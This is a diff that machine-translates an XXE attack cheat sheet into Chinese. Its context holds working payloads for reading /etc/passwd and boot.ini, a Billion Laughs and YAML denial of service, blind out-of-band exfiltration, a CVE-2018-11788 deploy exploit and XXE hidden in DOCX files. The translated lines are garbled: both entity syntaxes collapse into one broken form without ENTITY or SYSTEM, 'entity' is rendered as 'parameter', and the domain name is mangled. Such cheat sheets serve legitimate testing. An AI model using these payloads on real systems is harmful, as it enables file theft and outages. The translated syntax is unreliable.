@@ -1,14 +1,14 @@
-# XML External Entity
+# XML External entity
 
-> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+> XML外部实体攻击是针对解析XML输入并允许XML实体的应用程序的攻击类型。XML实体可用于告诉XML解析器在服务器上获取特定内容。
 
-**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.    
-Syntax: `<!ENTITY entity_name "entity_value">`
+**内部实体**：如果参数是在DTD中声明的，它被称为内部实体。
 
-**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.    
-Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
+语法：`<！参数名称“参数值”>`
 
-## Summary
+**外部实体**：如果参数在DTD外部声明，则称为外部实体。由“SYSTEM”标识。语法：`<！参数名称“参数值”>`
+
+## 概要
 
 - [Tools](#tools)
 - [Detect the vulnerability](#detect-the-vulnerability)
@@ -32,15 +32,16 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ```
   sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
   ```
- - [230-OOB](https://github.com/lc/230-OOB) and payload generation via [http://xxe.sh/](http://xxe.sh/)
+ - [230-OOB](https://github.com/lc/230-OOB) 以及通过 [http://xxe.sh/](http://xxe.sh/)
+   
    ```
    $ python3 230.py 2121
    ```
    
 
-## Detect the vulnerability
+### Detect the vulnerability
 
-Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
+基本实体测试，当XML解析器解析外部实体时，结果应该在“firstName”中包含“John”，在“lastName”中包含“Doe”。实体是在“DOCTYPE”元素中定义的。
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -51,11 +52,11 @@ Basic entity test, when the XML parser parses the external entities the result s
  </userInfo>
 ```
 
-It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.
+向服务器发送xml负载时，设置请求中的“Content Type:application/xml”可能会有帮助。
 
 ## Read file content
 
-Classic XXE, we try to display the content of the file `/etc/passwd` 
+经典的XXE，我们试图显示文件`/etc/passwd的内容`
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -84,7 +85,7 @@ Classic XXE, we try to display the content of the file `/etc/passwd`
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
 
-:warning: `SYSTEM` and `PUBLIC` are almost synonym.
+:warning:：SYSTEM和PUBLIC几乎是同义词。:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -94,7 +95,7 @@ Classic XXE, we try to display the content of the file `/etc/passwd`
 ```
 
 
-Classic XXE Base64 encoded
+经典XXE Base64编码
 
 ```xml
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
@@ -140,9 +141,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 
 ## Deny of service
 
-:warning: : These attacks might kill the service or the server, do not use them on the production.
-
-Billion Laugh Attack
+:warning:: 这些攻击可能会杀死服务或服务器，不要在生产中使用它们。
 
 ```xml
 <!DOCTYPE data [
@@ -155,7 +154,7 @@ Billion Laugh Attack
 <data>&a4;</data>
 ```
 
-Yaml attack
+Yaml 攻击
 
 ```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
@@ -171,11 +170,11 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 
 ## Blind XXE - Out of Band
 
-Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
+有时，您不会在页面中输出结果，但仍然可以通过带外攻击提取数据。
 
-### Blind XXE
+###  Blind XXE
 
-The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
+测试盲XXE的最简单方法是尝试加载远程资源，如Burp协作器。
 
 ```xml
 <?xml version="1.0" ?>
@@ -186,7 +185,7 @@ The easiest way to test for a blind XXE is to try to load a remote resource such
 ```
 
 
-Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
+将`/etc/passwd`的内容发送到“www.malitive.com”，您可能只收到第一行。
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -246,9 +245,9 @@ CVE-2018-11788 affecting versions:
 </features>
 ```
 
-Send the XML file to the `deploy` folder.
+将XML文件发送到“deploy”文件夹。
 
-Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
+参考文献[brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 ## XXE in exotic files
 
@@ -272,7 +271,7 @@ Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 ### XXE inside DOCX file
 
-Format of an Open XML file (inject the payload in any .xml file):
+打开的XML文件的格式（在任何.XML文件中插入负载）：
 
 - /_rels/.rels
 - [Content_Types].xml
@@ -281,7 +280,7 @@ Format of an Open XML file (inject the payload in any .xml file):
   - /ppt/presentation.xml
   - /xl/workbook.xml
 
-Then update the file `zip -u xxe.docx [Content_Types].xml`
+然后更新文件 `zip -u xxe.docx [Content_Types].xml`
 
 Tool : https://github.com/BuffaloWill/oxml_xxe
 
